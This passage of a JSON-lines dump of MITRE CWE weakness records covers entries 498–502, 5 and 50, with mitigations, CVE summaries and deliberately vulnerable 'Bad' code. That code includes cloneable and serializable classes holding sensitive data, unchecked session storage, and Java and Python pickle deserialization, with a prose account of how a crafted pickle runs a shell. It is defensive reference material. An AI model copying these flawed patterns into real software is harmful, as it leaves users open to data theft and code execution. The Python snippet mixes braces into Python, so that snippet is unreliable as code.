abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-22303", "Description": "An exposure of sensitive system information to an unauthorized control sphere vulnerability [CWE-497] in FortiManager versions prior to 7.0.2, 6.4.7 and 6.2.9 may allow a low privileged authenticated user to gain access to the FortiGate users credentials via the config conflict file."}, {"Reference": "CVE-2022-34458", "Description": " Dell Command | Update, Dell Update, and Alienware Update versions prior to 4.7 contain a Exposure of Sensitive System Information to an Unauthorized Control Sphere vulnerability in download operation component. A local malicious user could potentially exploit this vulnerability leading to the disclosure of confidential data. "}, {"Reference": "CVE-2022-22961", "Description": "VMware Workspace ONE Access, Identity Manager and vRealize Automation contain an information disclosure vulnerability due to returning excess information. A malicious actor with remote access may leak the hostname of the target system. Successful exploitation of this issue can lead to targeting victims."}, {"Reference": "CVE-2022-28651", "Description": "In JetBrains IntelliJ IDEA before 2021.3.3 it was possible to get passwords from protected fields"}, {"Reference": "CVE-2022-20664", "Description": "A vulnerability in the web management interface of Cisco Secure Email and Web Manager, formerly Cisco Security Management Appliance (SMA), and Cisco Email Security Appliance (ESA) could allow an authenticated, remote attacker to retrieve sensitive information from a Lightweight Directory Access Protocol (LDAP) external authentication server connected to an affected device. This vulnerability is due to a lack of proper input sanitization while querying the external authentication server. An attacker could exploit this vulnerability by sending a crafted query through an external authentication web page. A successful exploit could allow the attacker to gain access to sensitive information, including user credentials from the external authentication server. To exploit this vulnerability, an attacker would need valid operator-level (or higher) credentials."}, {"Reference": "CVE-2022-20734", "Description": "A vulnerability in Cisco SD-WAN vManage Software could allow an authenticated, local attacker to view sensitive information on an affected system. This vulnerability is due to insufficient file system restrictions. An authenticated attacker with netadmin privileges could exploit this vulnerability by accessing the vshell of an affected system. A successful exploit could allow the attacker to read sensitive information on the underlying operating system."}]}
{"ID": "498", "Name": "Cloneable Class Containing Sensitive Information", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The code contains a class with sensitive data, but the class is cloneable. The data can then be accessed by cloning the class.", "ExtendedDescription": "Cloneable classes are effectively open classes, since data cannot be hidden in them. Classes that do not explicitly deny cloning can be cloned by any other class without running the constructor.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "668", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "200", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C#", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"], "Note": "A class that can be cloned can be produced without executing the constructor. This is dangerous since the constructor may perform security-related checks. By allowing the object to be cloned, those checks may be bypassed."}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "If you do make your classes clonable, ensure that your clone method is final and throw super.clone()."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following example demonstrates the weakness."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class CloneClient {\n\t\t\tpublic CloneClient() //throws\n\t\t\tjava.lang.CloneNotSupportedException {\n\t\t\t\t\tTeacher t1 = new Teacher(\"guddu\",\"22,nagar road\");\n\t\t\t\t\t//...\n\t\t\t\t\t// Do some stuff to remove the teacher.\n\t\t\t\t\tTeacher t2 = (Teacher)t1.clone();\n\t\t\t\t\tSystem.out.println(t2.name);\n\t\t\t}\n\t\t\tpublic static void main(String args[]) {\n\t\t\t\t\tnew CloneClient();\n\t\t\t}\n\t}\n\tclass Teacher implements Cloneable {\n\t\t\tpublic Object clone() {\n\t\t\t\t\ttry {\n\t\t\t\t\t\treturn super.clone();\n\t\t\t\t\t}\n\t\t\t\t\tcatch (java.lang.CloneNotSupportedException e) {\n\t\t\t\t\t\t\tthrow new RuntimeException(e.toString());\n\t\t\t\t\t}\n\t\t\t}\n\t\t\tpublic String name;\n\t\t\tpublic String clas;\n\t\t\tpublic Teacher(String name,String clas) {\n\t\t\t\t\tthis.name = name;\n\t\t\t\t\tthis.clas = clas;\n\t\t\t}\n\t}\n```"}, {"BodyText": "Make classes uncloneable by defining a clone function like:"}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic final void clone() throws java.lang.CloneNotSupportedException {\n\t\tthrow new java.lang.CloneNotSupportedException();\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "499", "Name": "Serializable Class Containing Sensitive Data", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The code contains a class with sensitive data, but the class does not explicitly deny serialization. The data can be accessed by serializing the class through another class.", "ExtendedDescription": "Serializable classes are effectively open classes since data cannot be hidden in them. Classes that do not explicitly deny serialization can be serialized by any other class, which can then in turn use the data stored inside it.", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "668", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "200", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "an attacker can write out the class to a byte stream, then extract the important data from it."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "In Java, explicitly define final writeObject() to prevent serialization. This is the recommended solution. Define the writeObject() function to throw an exception explicitly denying serialization."}, {"Phase": ["Implementation"], "Description": "Make sure to prevent serialization of your objects."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This code creates a new record for a medical patient:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tclass PatientRecord {\n\t\tprivate String name;\n\t\tprivate String socialSecurityNum;\n\t\tpublic Patient(String name,String ssn) {\n\t\t\tthis.SetName(name);\n\t\t\tthis.SetSocialSecurityNumber(ssn);\n\t\t}\n\t}\n```"}, {"BodyText": "This object does not explicitly deny serialization, allowing an attacker to serialize an instance of this object and gain a patient's name and Social Security number even though those fields are private."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "5", "Name": "J2EE Misconfiguration: Data Transmission Without Encryption", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "Information sent over a network can be compromised while in transit. An attacker may be able to read or modify the contents if the data are sent in plaintext or are weakly encrypted.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "319", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}, {"Scope": ["Integrity"], "Impact": ["Modify Application Data"]}], "PotentialMitigations": [{"Phase": ["System Configuration"], "Description": "The product configuration should ensure that SSL or an encryption mechanism of equivalent strength and vetted reputation is used for all access-controlled pages."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Other", "Note": "\n\nIf an application uses SSL to guarantee confidential communication with client browsers, the application configuration should make it impossible to view any access controlled page without SSL. There are three common ways for SSL to be bypassed:\n\n\n  - A user manually enters URL and types \"HTTP\" rather than \"HTTPS\".\n\n  - Attackers intentionally send a user to an insecure URL.\n\n  - A programmer erroneously creates a relative link to a page in the application, which does not switch from HTTP to HTTPS. (This is particularly easy to do when the link moves between public and secured areas on a web site.)\n\n"}]}
{"ID": "50", "Name": "Path Equivalence: '//multiple/leading/slash'", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of multiple leading slash ('//multiple/leading/slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "161", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "ObservedExamples": [{"Reference": "CVE-2002-1483", "Description": "Read files with full pathname using multiple internal slash.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1483"}, {"Reference": "CVE-1999-1456", "Description": "Server allows remote attackers to read arbitrary files via a GET request with more than one leading / (slash) character in the filename.", "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1456"}, {"Reference": "CVE-2004-0578", "Description": "Server allows remote attackers to read arbitrary files via leading slash (//) characters in a URL request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0578"}, {"Reference": "CVE-2002-0275", "Description": "Server allows remote attackers to bypass authentication and read restricted files via an extra / (slash) in the requested URL.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0275"}, {"Reference": "CVE-2004-1032", "Description": "Product allows local users to delete arbitrary files or create arbitrary empty files via a target filename with a large number of leading slash (/) characters.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1032"}, {"Reference": "CVE-2002-1238", "Description": "Server allows remote attackers to bypass access restrictions for files via an HTTP request with a sequence of multiple / (slash) characters such as http://www.example.com///file/.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1238"}, {"Reference": "CVE-2004-1878", "Description": "Product allows remote attackers to bypass authentication, obtain sensitive information, or gain access via a direct request to admin/user.pl preceded by // (double leading slash).", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1878"}, {"Reference": "CVE-2005-1365", "Description": "Server allows remote attackers to execute arbitrary commands via a URL with multiple leading \"/\" (slash) characters and \"..\" sequences.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1365"}, {"Reference": "CVE-2000-1050", "Description": "Access directory using multiple leading slash.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-1050"}, {"Reference": "CVE-2001-1072", "Description": "Bypass access restrictions via multiple leading slash, which causes a regular expression to fail.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1072"}, {"Reference": "CVE-2004-0235", "Description": "Archive extracts to arbitrary files using multiple leading slash in filenames in the archive.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0235"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "500", "Name": "Public Static Field Not Marked Final", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "An object contains a public static field that is not marked final, which might allow it to be modified in unexpected ways.", "ExtendedDescription": "Public static variables can be read without an accessor and changed without a mutator by any classes in the application.", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "493", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "BackgroundDetails": ["When a field is declared public but not final, the field can be read and written to by arbitrary Java code."], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "The object could potentially be tampered with."}, {"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "The object could potentially allow the object to be read."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Clearly identify the scope for all critical data elements, including whether they should be regarded as static."}, {"Phase": ["Implementation"], "Description": "\n\nMake any static fields private and constant.\n\n\nA constant field is denoted by the keyword 'const' in C/C++ and ' final' in Java\n"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following examples use of a public static String variable to contain the name of a property/configuration file for the application."}, {"Nature": "Bad", "Language": "C++", "ExampleCode": "```\n\tclass SomeAppClass {\n\t\t\tpublic:\n\t\t\t\tstatic string appPropertiesConfigFile = \"app/properties.config\";\n\t\t\t...\n\t}\n```"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class SomeAppClass {\n\t\t\tpublic static String appPropertiesFile = \"app/Application.properties\";\n\t\t\t...\n\t}\n```"}, {"BodyText": "Having a public static variable that is not marked final (constant) may allow the variable to the altered in a way not intended by the application. In this example the String variable can be modified to indicate a different on nonexistent properties file which could cause the application to crash or caused unexpected behavior."}, {"Nature": "Good", "Language": "C++", "ExampleCode": "```\n\tclass SomeAppClass {\n\t\t\tpublic:\n\t\t\t\tstatic const string appPropertiesConfigFile = \"app/properties.config\";\n\t\t\t...\n\t}\n```"}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class SomeAppClass {\n\t\t\tpublic static final String appPropertiesFile = \"app/Application.properties\";\n\t\t\t...\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "501", "Name": "Trust Boundary Violation", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product mixes trusted and untrusted data in the same data structure or structured message.", "ExtendedDescription": "A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "664", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following code accepts an HTTP request and stores the username parameter in the HTTP session object before checking to ensure that the user has been authenticated."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tusrname = request.getParameter(\"usrname\");\n\tif (session.getAttribute(ATTR_USR) == null) {\n\t\tsession.setAttribute(ATTR_USR, usrname);\n\t}\n```"}, {"Nature": "Bad", "Language": "C#", "ExampleCode": "```\n\tusrname = request.Item(\"usrname\");\n\tif (session.Item(ATTR_USR) == null) {\n\t\tsession.Add(ATTR_USR, usrname);\n\t}\n```"}, {"BodyText": "Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "502", "Name": "Deserialization of Untrusted Data", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.", "ExtendedDescription": "\n\nIt is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.\n\n\nData that is untrusted can not be trusted to be well-formed.\n\n\nWhen developers place no restrictions on \"gadget chains,\" or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.\n", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "913", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "913", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "915", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Ruby", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "PHP", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Python", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "JavaScript", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "ICS/OT", "Prevalence": "Often"}], "BackgroundDetails": ["Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred (\"serialization\"), then extracting the serialized data to reconstruct the original object (\"deserialization\")."], "AlternateTerms": [{"Term": "Marshaling, Unmarshaling", "Description": "Marshaling and unmarshaling are effectively synonyms for serialization and deserialization, respectively."}, {"Term": "Pickling, Unpickling", "Description": "In Python, the \"pickle\" functionality is used to perform serialization and deserialization."}, {"Term": "PHP Object Injection", "Description": "Some PHP application researchers use this term when attacking unsafe use of the unserialize() function; but it is also used for CWE-915."}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data", "Unexpected State"], "Note": "Attackers can modify unexpected objects or data that was assumed to be safe from modification."}, {"Scope": ["Availability"], "Impact": ["DoS: Resource Consumption (CPU)"], "Note": "If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate."}, {"Scope": ["Other"], "Impact": ["Varies by Context"], "Note": "The consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "Implementation"], "Description": "If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified."}, {"Phase": ["Implementation"], "Description": "When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe."}, {"Phase": ["Implementation"], "Description": "Explicitly define a final object() to prevent deserialization."}, {"Phase": ["Architecture and Design", "Implementation"], "Description": "\n\nMake fields transient to protect them from deserialization.\n\n\nAn attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.\n"}, {"Phase": ["Implementation"], "Description": "Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Add only acceptable classes to an allowlist. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This code snippet deserializes an object from a file and uses it as a UI button:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\ttry {\n\t\tFile file = new File(\"object.obj\");\n\t\tObjectInputStream in = new ObjectInputStream(new FileInputStream(file));\n\t\tjavax.swing.JButton button = (javax.swing.JButton) in.readObject();\n\t\tin.close();\n\t}\n```"}, {"BodyText": "This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed."}, {"BodyText": "To mitigate this, explicitly define final readObject() to prevent deserialization. An example of this is:"}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tprivate final void readObject(ObjectInputStream in) throws java.io.IOException {\n\tthrow new java.io.IOException(\"Cannot be deserialized\"); }\n```"}]}, {"Entries": [{"IntroText": "In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [REF-467], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token."}, {"Nature": "Bad", "Language": "Python", "ExampleCode": "```\n\ttry {\n\t\t\tclass ExampleProtocol(protocol.Protocol):\n\t\t\tdef dataReceived(self, data):\n\t\t\t# Code that would be here would parse the incoming data\n\t\t\t# After receiving headers, call confirmAuth() to authenticate\n\t\t\tdef confirmAuth(self, headers):\n\t\t\ttry:\n\t\t\ttoken = cPickle.loads(base64.b64decode(headers['AuthToken']))\n\t\t\tif not check_hmac(token['signature'], token['data'], getSecretKey()):\n\t\t\traise AuthFail\n\t\t\tself.secure_data = token['data']\n\t\t\texcept:\n\t\t\traise AuthFail\n\t}\n```"}, {"BodyText": "Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object \"AuthToken\" that instantiates one of Python's subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python's subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh."}]}], "ObservedExamples": [{"Reference": "CVE-2019-12799", "Description": "chain: bypass of untrusted deserialization issue (CWE-502) by using an assumed-trusted class (CWE-183)", "Link": "https://www.cve.org/CVERecord?id=CVE-2019-12799"}, {"Reference": "CVE-2015-8103", "Description": "Deserialization issue in commonly-used Java library allows remote execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2015-8103"}, {"Reference": "CVE-2015-4852", "Description": "Deserialization issue in commonly-used Java library allows remote execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2015-4852"}, {"Reference": "CVE-2013-1465", "Description": "Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-1465"}, {"Reference": "CVE-2012-3527", "Description": "Use of PHP unserialize function on untrusted input in content management system might allow code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-3527"}, {"Reference": "CVE-2012-0911", "Description": "Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0911"}, {"Reference": "CVE-2012-0911", "Description": "Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0911"}, {"Reference": "CVE-2011-2520", "Description": "Python script allows local users to execute code via pickled data.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-2520"}, {"Reference": "CVE-2012-4406", "Description": "Unsafe deserialization using pickle in a Python script.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-4406"}, {"Reference": "CVE-2003-0791", "Description": "Web browser allows execution of native methods via a crafted string to a JavaScript function that deserializes the string.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0791"}], "RelatedAttackPatterns": ["586"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization."}], "Top25Examples": [{"Reference": "CVE-2021-35095", "Description": "Improper serialization of message queue client registration can lead to race condition allowing multiple gunyah message clients to register with same label in Snapdragon Connectivity, Snapdragon Mobile"}, {"Reference": "CVE-2021-38241", "Description": "Deserialization issue discovered in Ruoyi before 4.6.1 allows remote attackers to run arbitrary code via weak cipher in Shiro framework."}, {"Reference": "CVE-2021-40604", "Description": "A Server-Side Request Forgery (SSRF) vulnerability in IPS Community Suite before 4.6.2 allows remote authenticated users to request arbitrary URLs or trigger deserialization via phar protocol when generating class names dynamically. In some cases an exploitation is possible by an unauthenticated user."}, {"Reference": "CVE-2022-21647", "Description": "CodeIgniter is an open source PHP full-stack web framework. Deserialization of Untrusted Data was found in the `old()` function in CodeIgniter4. Remote attackers may inject auto-loadable arbitrary objects with this vulnerability, and possibly execute existing PHP code on the server. We are aware of a working exploit, which can lead to SQL injection. Users are advised to upgrade to v4.1.6 or later. Users unable to upgrade as advised to not use the `old()` function and form_helper nor `RedirectResponse::withInput()` and `redirect()->withInput()`."}, {"Reference": "CVE-2022-21663", "Description": "WordPress is a free and open-source content management system written in PHP and paired with a MariaDB database. On a multisite, users with Super Admin role can bypass explicit/additional hardening under certain conditions through object injection. This has been patched in WordPress version 5.8.3. Older affected versions are also fixed via security release, that go back till 3.7.37. We strongly recommend that you keep auto-updates enabled. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-22958", "Description": "VMware Workspace ONE Access, Identity Manager and vRealize Automation contain two remote code execution vulnerabilities (CVE-2022-22957 & CVE-2022-22958). A malicious actor with administrative access can trigger deserialization of untrusted data through malicious JDBC URI which may result in remote code execution."}, {"Reference": "CVE-2022-23734", "Description": "A deserialization of untrusted data vulnerability was identified in GitHub Enterprise Server that could potentially lead to remote code execution on the SVNBridge. To exploit this vulnerability, an attacker would need to gain access via a server-side request forgery (SSRF) that would let an attacker control the data being deserialized. This vulnerability affected all versions of GitHub Enterprise Server prior to v3.6 and was fixed in versions 3.5.3, 3.4.6, 3.3.11, and 3.2.16. This vulnerability was reported via the GitHub Bug Bounty program."}, {"Reference": "CVE-2022-2433", "Description": "The WordPress Infinite Scroll \u2013 Ajax Load More plugin for WordPress is vulnerable to deserialization of untrusted input via the 'alm_repeaters_export' parameter in versions up to, and including 5.5.3. This makes it possible for unauthenticated users to call files using a PHAR wrapper, granted they can trick a site administrator into performing an action such as clicking on a link, that will deserialize and call arbitrary PHP Objects that can be used to perform a variety of malicious actions granted a POP chain is also present. It also requires that the attacker is successful in uploading a file with the serialized payload."}, {"Reference": "CVE-2022-24818", "Description": "GeoTools is an open source Java library that provides tools for geospatial data. The GeoTools library has a number of data sources that can perform unchecked JNDI lookups, which in turn can be used to perform class deserialization and result in arbitrary code execution. Similar to the Log4J case, the vulnerability can be triggered if the JNDI names are user-provided, but requires admin-level login to be triggered. The lookups are now restricted in GeoTools 26.4, GeoTools 25.6, and GeoTools 24.6. Users unable to upgrade should ensure that any downstream application should not allow usage of remotely provided JNDI strings."}, {"Reference": "CVE-2022-24847", "Description": "GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. The GeoServer security mechanism can perform an unchecked JNDI lookup, which in turn can be used to perform class deserialization and result in arbitrary code execution. The same can happen while configuring data stores with data sources located in JNDI, or while setting up the disk quota mechanism. In order to perform any of the above changes, the attack needs to have obtained admin rights and use either the GeoServer GUI, or its REST API. The lookups are going to be restricted in GeoServer 2.21.0, 2.20.4, 1.19.6. Users unable to upgrade should restrict access to the `geoserver/web` and `geoserver/rest` via a firewall and ensure that the GeoWebCache is not remotely accessible."}, {"Reference": "CVE-2022-3360", "Description": "The LearnPress WordPress plugin before 4.1.7.2 unserialises user input in a REST API endpoint available to unauthenticated users, which could lead to PHP Object Injection when a suitable gadget is present, leadint to remote code execution (RCE). To successfully exploit this vulnerability attackers must have 